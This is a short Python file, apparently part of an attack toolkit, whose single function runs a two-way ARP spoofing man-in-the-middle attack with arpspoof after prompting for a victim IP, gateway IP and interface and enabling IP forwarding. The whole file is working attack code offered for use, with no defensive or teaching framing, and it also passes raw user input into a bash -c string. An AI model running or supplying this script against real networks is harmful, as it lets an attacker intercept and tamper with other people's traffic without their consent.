### attacks.py
import subprocess

def run_arpspoof():
    target_ip = input("Enter victim IP: ")
    gateway_ip = input("Enter gateway IP: ")
    iface = input("Enter interface (e.g., eth0): ")

    print("[*] Enabling IP forwarding...")
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")

    print("[+] Starting ARP spoofing attack using arpspoof. Press CTRL+C to stop.")
    try:
        subprocess.Popen(["gnome-terminal", "--", "bash", "-c", f"arpspoof -i {iface} -t {target_ip} {gateway_ip}; exec bash"])
        subprocess.call(["arpspoof", "-i", iface, "-t", gateway_ip, target_ip])
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted. IP forwarding remains enabled. You may disable it manually if needed.")

